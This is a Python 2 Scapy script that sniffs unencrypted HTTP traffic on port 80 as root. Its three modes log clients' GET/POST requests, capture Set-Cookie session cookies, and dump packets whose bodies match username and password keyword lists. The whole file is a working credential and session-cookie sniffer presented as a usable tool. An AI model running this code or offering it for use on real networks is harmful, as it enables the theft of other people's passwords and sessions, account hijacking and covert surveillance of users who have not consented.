#!/usr/bin/python
import logging,os,sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

## FUNCTIONS ##

def getUserAgent(load):
	for l in load:
		if "user-agent: " in l.lower():
			agent_os = l.split(' ')[3]
			agent_os_ver = l.split(' ')[4]
			agent_browser = l.split(' ')[7]
			agent = agent_os+" "+agent_os_ver+" "+agent_browser
			return str(agent)

def sniffGetPost(pkt):
	if pkt.haslayer(TCP):
		if pkt.haslayer(Raw):
			client = pkt[IP].src
			load = repr(pkt[Raw].load)[1:-1]
			post = 0
			get = 0
			try:
				headers,body = load.split(r"\r\n\r\n",1)
			except:
				headers = load
				body = ""
			header_lines = headers.split(r"\r\n")
			for h in header_lines:
				if "post /" in h.lower():
					post = h.split(' ')[1]
				if "get /" in h.lower():
					get = h.split(' ')[1]
			if post:
				for h in header_lines:
					if "host: " in h.lower():
						host = h.split(' ')[1]
						try:
							print "("+client+" : "+getUserAgent(header_lines)+") POST: "+host+post+"\n"
						except:
							print "("+client+") POST: "+host+post+"\n"

			if get:
				for h in header_lines:
					if "host: " in h.lower():
						host = h.split(' ')[1]
						try:
							print "("+client+" : "+getUserAgent(header_lines)+") GET: "+host+get+"\n"
						except:
							print "("+client+") GET: "+host+get+"\n"

def sniffCookie(pkt):
	if pkt.haslayer(TCP):
		if pkt.haslayer(Raw):
			client = pkt[IP].dst
			server = pkt[IP].src
			load = repr(pkt[Raw].load)[1:-1]
			set_cookie = 0
			try:
				headers,body = load.split(r"\r\n\r\n",1)
			except:
				headers = load
				body = ""
			header_lines = headers.split(r"\r\n")
			for h in header_lines:
				if "set-cookie: " in h.lower():
					set_cookie = h.split(' ')[1]
			if set_cookie:
				try:
					print "("+server+" -> "+client+" : "+getUserAgent(header_lines)+") Set-Cookie: "+set_cookie+"\n"
				except:
					print "("+server+" -> "+client+") Set-Cookie: "+set_cookie+"\n"

def sniffCreds(pkt):
	if pkt.haslayer(TCP):
		if pkt.haslayer(Raw):
			client = pkt[IP].src
			server = pkt[IP].dst
			load = repr(pkt[Raw].load)[1:-1]
			username = 0
			password = 0
			username_list = ["username=","user=","log=","login=","player=","username:","user:","log:","login:","user "]
			password_list = ["password=","pass=","pwd=","pw=","passw=","passwd=","pass:","password:","pass ","passwd:"]
			try:
				headers,body = load.split(r"\r\n\r\n",1)
			except:
				headers = load
				body = ""
			header_lines = headers.split(r"\r\n")
			body_lines = body.split(r"\r\n")
			for b in body_lines:
				for usernames in username_list:
					if usernames in b.lower():
						username = b.split(' ')[0]
			for b in body_lines:
				for passwords in password_list:
					if passwords in b.lower():
						password = b.split(' ')[0]
			if username or password:
				pkt[Raw].show()


def main(pkt):
	sniffGetPost(pkt)
	sniffCookie(pkt)
	sniffCreds(pkt)


## MAIN ##

if __name__ == '__main__':
	if os.getuid() != 0:
		print "You must be root to run this script."
		exit(1)
	if len(sys.argv) >= 2:
		if sys.argv[1].lower() == "getpost":
			print "Sniffing for GET/POST requests.."
			sniff(filter="tcp port 80",prn=sniffGetPost)
		elif sys.argv[1].lower() == "cookie":
			print "Sniffing for cookies.."
			sniff(filter="tcp port 80",prn=sniffCookie)
		elif sys.argv[1].lower() == "creds":
			print "Sniffing for credentials.."
			sniff(filter="tcp port 80",prn=sniffCreds)
		else:
			print "Usage: %s <optional type arg>\n\tArgs:\n\t\"GetPost\" - Sniffs for GET and POST requests made by client.\n\t\"Cookie\" - Sniffs for cookies sent to client.\n\t\"Creds\" - Sniffs for user credentials (i.e. Unencrypted usernames and passwords)." % sys.argv[0]
			exit(1)
	else:
		print "Sniffing.."
		sniff(filter="tcp port 80",prn=main)
